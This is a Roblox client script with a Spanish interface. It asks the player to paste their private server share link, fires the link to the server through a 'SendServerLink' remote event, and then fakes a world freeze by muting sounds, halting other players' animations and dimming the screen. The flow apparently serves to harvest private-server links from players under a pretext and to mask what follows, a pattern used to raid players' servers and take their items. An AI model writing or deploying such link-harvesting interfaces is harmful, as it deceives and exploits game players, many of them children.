local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

-- Crear UI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local Button = Instance.new("TextButton")
local Label = Instance.new("TextLabel")
local ErrorLabel = Instance.new("TextLabel")

ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

-- Frame
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
Frame.BorderSizePixel = 0
Frame.ZIndex = 10

-- Label
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.new(1, 1, 1)
Label.BackgroundTransparency = 1
Label.ZIndex = 11

-- TextBox
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code"
TextBox.ZIndex = 12

-- Error Label
ErrorLabel.Parent = Frame
ErrorLabel.Size = UDim2.new(1, -20, 0, 30)
ErrorLabel.Position = UDim2.new(0, 10, 0, 110)
ErrorLabel.Text = ""
ErrorLabel.TextColor3 = Color3.new(1, 0, 0)
ErrorLabel.BackgroundTransparency = 1
ErrorLabel.ZIndex = 13

-- Button
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
Button.TextColor3 = Color3.new(1, 1, 1)
Button.ZIndex = 14

-- Validar link
local function isValidLink(link)
    return string.find(link, "https://www.roblox.com/share?code") ~= nil
end

-- Función para simular “pausa total del mundo” solo para el jugador
local function simulateWorldPause()
    -- Silenciar todos los sonidos locales
    for _, sound in pairs(Workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Playing = false
        end
    end
    for _, sound in pairs(SoundService:GetChildren()) do
        if sound:IsA("Sound") then
            sound.Playing = false
        end
    end

    -- Detener animaciones de todos los personajes excepto el jugador
    local tracks = {}
    for _, plr in pairs(game.Players:GetPlayers()) do
        if plr ~= Player and plr.Character then
            local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
                    track:AdjustSpeed(0) -- pausar animación
                    table.insert(tracks, track)
                end
            end
        end
    end

    -- Detener partículas, efectos y TweenService locales
    local pausedTweens = {}
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
            obj.Enabled = false
        elseif obj:IsA("TweenInfo") then
            table.insert(pausedTweens, obj) -- opcional
        end
    end

    -- Overlay para efecto visual de “congelamiento”
    local overlay = Instance.new("Frame")
    overlay.Parent = Player:WaitForChild("PlayerGui")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.new(0, 0, 0)
    overlay.BackgroundTransparency = 0.4
    overlay.ZIndex = 50
end

-- Botón
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isValidLink(link) then
        local remoteEvent = ReplicatedStorage:WaitForChild("SendServerLink")
        remoteEvent:FireServer(link)
        simulateWorldPause()
        ErrorLabel.Text = ""
    else
        ErrorLabel.Text = "El link no es válido"
    end
end)
